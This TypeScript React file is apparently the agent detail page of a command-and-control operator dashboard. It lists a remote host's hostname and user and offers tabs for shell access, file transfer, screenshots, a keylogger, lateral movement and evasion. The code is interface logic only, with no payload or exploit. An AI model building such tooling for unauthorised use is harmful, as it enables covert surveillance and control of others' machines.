import { useEffect, useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { useStore } from '@/stores/useStore'
import { api } from '@/services/api'
import { AgentDetailContent } from '@/components/agents/AgentDetailContent'
import { GradientBackground } from '@/components/ui/GradientBackground'
import { GradientText } from '@/components/ui/GradientText'
import { DotGrid } from '@/components/ui/DotGrid'
import { Button } from '@/components/ui/Button'
import { Monitor, ArrowLeft, RefreshCw, Wifi, WifiOff, AlertTriangle, XCircle, CheckCircle, Zap, Terminal, FileText, Keyboard, ArrowRightLeft, Shield, Cpu } from 'lucide-react'
import { formatDistanceToNow } from 'date-fns'
import clsx from 'clsx'

export function AgentDetailPage() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const { agents, selectedAgent, setSelectedAgent, fetchAgents, addNotification, fetchTasks, fetchFileTransfers, fetchScreenshots, fetchKeystrokes, fetchProcesses, fetchLateralMoves, fetchEvasionResults, fetchModules } = useStore()
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState<string>('overview')

  useEffect(() => {
    if (!id) {
      navigate('/agents')
      return
    }

    const loadAgent = async () => {
      setLoading(true)
      try {
        await fetchAgents()
        const agent = agents.find(a => a.id === id)
        if (agent) {
          setSelectedAgent(agent)
          // Pre-fetch all data
          await Promise.all([
            fetchTasks(agent.id),
            fetchFileTransfers(agent.id),
            fetchScreenshots(agent.id),
            fetchKeystrokes(agent.id),
            fetchProcesses(agent.id),
            fetchLateralMoves(agent.id),
            fetchEvasionResults(agent.id),
            fetchModules(agent.id),
          ])
        } else {
          addNotification({ type: 'error', message: 'Agent not found' })
          navigate('/agents')
        }
      } catch (error) {
        addNotification({ type: 'error', message: `Failed to load agent: ${error}` })
        navigate('/agents')
      } finally {
        setLoading(false)
      }
    }

    loadAgent()
  }, [id, agents, navigate, fetchAgents, setSelectedAgent, addNotification, fetchTasks, fetchFileTransfers, fetchScreenshots, fetchKeystrokes, fetchProcesses, fetchLateralMoves, fetchEvasionResults, fetchModules])

  if (loading) {
    return (
      <GradientBackground>
        <div className="p-6 space-y-6">
          <div className="flex items-center gap-4">
            <RefreshCw className="w-8 h-8 text-accent-400 animate-spin" />
            <GradientText className="text-2xl font-bold" colors={['#f8fafc', '#d946ef', '#a855f7']}>
              Loading agent...
            </GradientText>
          </div>
        </div>
      </GradientBackground>
    )
  }

  if (!selectedAgent || selectedAgent.id !== id) {
    return (
      <GradientBackground>
        <div className="p-6 space-y-6">
          <div className="flex items-center gap-4">
            <div className="relative w-10 h-10 rounded-xl bg-dark-800/50 border border-dark-700 flex items-center justify-center overflow-hidden">
              <DotGrid className="absolute inset-0" dotSize={2} gap={8} baseColor="#1e293b" activeColor="#d946ef" proximity={50} />
              <AlertTriangle className="w-5 h-5 text-yellow-400 relative z-10" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-dark-100">Agent Not Found</h1>
              <p className="text-dark-400">The requested agent could not be found.</p>
            </div>
          </div>
          <Button onClick={() => navigate('/agents')} variant="secondary">
            <ArrowLeft className="w-4 h-4 mr-2" /> Back to Agents
          </Button>
        </div>
      </GradientBackground>
    )
  }

  const agent = selectedAgent

  const statusConfig = {
    online: { icon: CheckCircle, color: 'text-green-500', bg: 'bg-green-500', label: 'Online', border: 'border-green-500/50' },
    offline: { icon: XCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Offline', border: 'border-red-500/50' },
    stale: { icon: AlertTriangle, color: 'text-yellow-500', bg: 'bg-yellow-500', label: 'Stale', border: 'border-yellow-500/50' },
    dead: { icon: XCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Dead', border: 'border-red-500/50' },
  }

  const status = statusConfig[agent.status] || statusConfig.offline
  const StatusIcon = status.icon
  const lastSeen = agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'

  const tabs = [
    { id: 'overview', label: 'Overview', icon: Monitor },
    { id: 'shell', label: 'Shell', icon: Terminal },
    { id: 'files', label: 'Files', icon: FileText },
    { id: 'tasks', label: 'Tasks', icon: Terminal },
    { id: 'screenshots', label: 'Screenshots', icon: Monitor },
    { id: 'keylogger', label: 'Keylogger', icon: Keyboard },
    { id: 'processes', label: 'Processes', icon: Cpu },
    { id: 'lateral', label: 'Lateral', icon: ArrowRightLeft },
    { id: 'evasion', label: 'Evasion', icon: Shield },
    { id: 'modules', label: 'Modules', icon: Zap },
  ]

  return (
    <GradientBackground>
      <div className="p-6 space-y-6">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-6">
          <div className="flex items-center gap-4">
            <Button variant="ghost" onClick={() => navigate('/agents')} className="lg:hidden">
              <ArrowLeft className="w-4 h-4" />
            </Button>
            <div className="relative w-12 h-12 rounded-xl bg-dark-800/50 border border-dark-700 flex items-center justify-center overflow-hidden flex-shrink-0">
              <DotGrid className="absolute inset-0" dotSize={2} gap={10} baseColor="#1e293b" activeColor="#d946ef" proximity={60} />
              <Monitor className="w-6 h-6 text-accent-400 relative z-10" />
            </div>
            <div>
              <GradientText className="text-3xl font-bold" colors={['#f8fafc', '#d946ef', '#a855f7']}>
                {agent.hostname}
              </GradientText>
              <p className="text-dark-400">{agent.username} @ {agent.os_version} ({agent.arch})</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <span className={clsx('px-3 py-1 rounded-full text-xs font-medium', status.color, status.bg + '/20', status.border)}>
              <StatusIcon className="w-3 h-3 mr-1" />
              {status.label}
            </span>
            <Button variant="ghost" onClick={() => { setSelectedAgent(null); navigate('/agents') }}>
              <ArrowLeft className="w-4 h-4 mr-1" /> Back
            </Button>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex flex-wrap gap-1 mb-4 bg-dark-800/50 p-1 rounded-lg border border-dark-700">
          {tabs.map((tab) => {
            const Icon = tab.icon
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={clsx(
                  'flex items-center gap-2 px-3 py-2 rounded-md text-sm font-medium transition-all duration-200',
                  activeTab === tab.id
                    ? 'bg-accent-600 text-white shadow-lg shadow-accent-600/25'
                    : 'text-dark-400 hover:text-dark-100 hover:bg-dark-700/50'
                )}
              >
                <Icon className="w-4 h-4" />
                <span>{tab.label}</span>
              </button>
            )
          })}
        </div>

        {/* Content */}
        <AgentDetailContent agent={agent} activeTab={activeTab} setActiveTab={setActiveTab} />
      </div>
    </GradientBackground>
  )
}